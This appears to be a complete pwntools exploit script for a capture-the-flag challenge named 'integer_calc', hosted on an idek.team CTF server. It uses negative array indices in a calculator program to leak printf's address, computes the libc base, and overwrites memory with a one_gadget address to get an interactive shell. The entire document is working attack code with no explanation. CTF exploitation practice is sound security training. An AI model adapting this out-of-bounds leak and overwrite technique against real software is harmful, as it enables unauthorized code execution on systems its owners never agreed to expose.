#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./integer_calc')
libc = ELF('./libc.so.6')

rop = ROP(exe)

host, port = "arithmetic-calculator.chal.idek.team", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def store(idx,val):
  p.sendlineafter('> ', '0')
  p.sendlineafter('index: ', str(idx))
  p.sendlineafter('value: ', str(val))

def add(idx1,idx2):
  p.sendlineafter('> ', '2')
  p.sendlineafter('index: ', str(idx1))
  p.sendlineafter('index: ', str(idx2))

add(0,-19)
p.recvuntil('result: ',drop=True)
libc.address = int(p.recvuntil('\n',drop=True),10) - libc.sym['printf']
print('libc base = '+hex(libc.address))

onegadgets = one_gadget('libc.so.6', libc.address)

store(-21, onegadgets[1])


p.interactive()

